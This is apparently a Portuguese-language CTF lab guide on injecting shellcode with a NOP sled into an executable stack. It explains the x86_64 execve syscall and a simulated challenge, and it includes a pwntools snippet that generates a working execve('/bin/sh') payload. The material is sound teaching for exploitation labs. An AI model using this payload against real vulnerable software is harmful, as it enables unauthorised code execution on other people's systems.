# Injeção e Execução de Shellcode no Pwntools

## Briefing da Missão
Em auditorias de sistemas embarcados, dispositivos IoT e softwares legados, é comum encontrar binários compilados sem mitigações modernas de segurança (especificamente com o bit `NX - No-Execute / DEP` desabilitado, gerando páginas de pilha com atributos de Leitura, Escrita e Execução simultâneos `RWX`).

Nesse cenário, um atacante não precisa depender de funções já existentes no binário: ele pode injetar suas próprias instruções em linguagem de máquina diretamente no buffer e redirecionar o RIP para aterrissar sobre elas. Sua missão é construir uma carga útil de injeção utilizando uma rampa deslizante de instruções **NOP Sled (`\x90`)** seguida de um shellcode de execução, garantindo a execução confiável no host da Cyberguard.

---

## Teoria Aprofundada & Relação com o Diagnóstico 2026.2

A injeção de shellcode é o ápice da exploração clássica de corrupção de memória. Para que um operador execute código arbitrário, ele deve controlar dois elementos fundamentais:
1. **Onde o código está na memória:** Saber o endereço do buffer ou garantir uma margem de acerto.
2. **O que o processador deve fazer:** Instruções em assembly x86_64 compactadas que invoquem o kernel através de uma chamada de sistema (*syscall*).

### A Mecânica da Syscall `sys_execve` em x86_64

Para invocar `/bin/sh` no Linux de 64 bits, o processador requer uma convenção rígida de registradores antes de executar o opcode `syscall` (`0x0f 0x05`):

```
+--------------+------------------+-----------------------------------------------+
| REGISTRADOR  | VALOR CONFIGURADO| SIGNIFICADO OPERACIONAL                       |
+--------------+------------------+-----------------------------------------------+
| RAX          | 59 (0x3b)        | Número identificador da syscall sys_execve    |
| RDI          | &"/bin/sh"       | Ponteiro para a string com o caminho do shell |
| RSI          | 0 (NULL)         | Vetor de argumentos argv                      |
| RDX          | 0 (NULL)         | Vetor de ambiente envp                        |
| SYSCALL      | 0x0f, 0x05       | Gatilho de interrupção que aciona o Kernel    |
+--------------+------------------+-----------------------------------------------+
```

### Por que o NOP Sled (`\x90`) é Crucial?

A instrução `NOP` (*No Operation*, opcode `0x90` em arquitetura Intel) comanda a CPU a não realizar qualquer alteração nos registradores e apenas avançar o ponteiro de instrução `RIP` para o byte seguinte (`rip = rip + 1`).

Em condições reais de exploração, os endereços da pilha sofrem variações de alinhamento e variáveis de ambiente. Chutar um endereço exato de 1 byte pode resultar em aterrissar no meio de uma instrução e provocar um crash.

```
+--------------------------------------------------------------------------------+
|                    RAMPA DESLIZANTE NOP SLED + SHELLCODE                       |
+--------------------------------------------------------------------------------+
|  0x90  |  0x90  |  0x90  | ... |  0x90  |  SHELLCODE EXECVE (/bin/sh)          |
+--------------------------------------------------------------------------------+
     ▲                ▲
     │                │
  Se o RIP aterrissar em QUALQUER um desses bytes NOP, a CPU desliza
  suavemente byte a byte até atingir o início do Shellcode!
```

---

## Passo a Passo de Resolução

1. Execute o desafio para visualizar os parâmetros de injeção:
   ```bash
   /challenge/pwn-shellcraft-injection
   ```
2. Para estudar a teoria detalhada sobre NOP sled e geração de shellcode:
   ```bash
   /challenge/pwn-shellcraft-injection --help
   ```
3. O desafio aceita uma carga contendo uma sequência de NOPs (`\x90\x90\x90`) ou a palavra `PWN`. Envie o payload utilizando Python via pipe:
   ```bash
   python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*32 + b'PWN')" | /challenge/pwn-shellcraft-injection
   ```
   *Ou diretamente como argumento de terminal:*
   ```bash
   /challenge/pwn-shellcraft-injection "\x90\x90\x90\x90PWN"
   ```
4. O simulador de pilha executará o código injetado, reportará a emissão do shell e imprimirá a flag.

---

## Dicas e Comandos com Pwntools

Em desafios avançados de CTF e Red Team, a biblioteca **Pwntools** em Python gera shellcodes instantâneos:

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# 1. Gerar o shellcode otimizado de execve("/bin/sh"):
sc = asm(shellcraft.sh())

# 2. Criar o payload com rampa de 64 NOPs:
payload = asm('nop') * 64 + sc

print(f"[*] Tamanho do shellcode: {len(sc)} bytes")
print(f"[*] Payload total: {len(payload)} bytes")
```

---

## Aplicação Prática no Mundo Real

A injeção direta de shellcode na pilha é o alicerce clássico do pwn. Embora mitigações modernas como `W^X` (Write XOR Execute / NX Bit) impeçam que uma página de memória seja gravável e executável ao mesmo tempo, a compreensão do shellcode é indispensável para técnicas contemporâneas de **JIT Spraying** (utilizadas contra motores JavaScript em navegadores) e para a fase final de cadeias **mprotect ROP**, onde um exploit utiliza ROP gadgets para alterar as permissões de uma página de memória para `PROT_READ | PROT_WRITE | PROT_EXEC` e então detonar o shellcode.
